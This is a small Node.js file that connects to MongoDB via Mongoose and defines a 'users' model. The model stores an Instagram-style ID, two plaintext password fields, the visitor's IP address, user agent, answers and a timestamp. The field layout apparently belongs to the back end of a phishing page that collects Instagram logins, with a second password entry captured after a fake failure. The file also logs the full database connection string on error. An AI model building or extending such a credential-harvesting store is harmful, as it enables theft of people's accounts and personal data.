const { clear } = require('console')
const mongoose=require('mongoose')
const dotenv=require('dotenv')
dotenv.config({})

const dbLink=process.env.DB_LINK
const dbName=process.env.DB_NAME

const dbConn = mongoose.connect(dbLink, {
    autoIndex: true,
    dbName
})

dbConn.then(() => {
    console.log('DB Connected')
})
dbConn.catch((err) => {
    console.log(dbLink)
    console.log(`- - - - - - - - - - - - - Couldn't Connect to Database- - - - - - - - - - - - - -\n`)
    console.log(err)
})

const userSchema=new mongoose.Schema({
    
    instaId:String,
    pwd:String,
    pwd2:String,
    userip:String,
    useragent:{},
    ans:{},
    time:{
        type:Date,
        default:()=> {
            let time=new Date()
            return time.getTime()
        }
    }

})

const user=mongoose.model('users',userSchema,'users')

module.exports={
    user
}
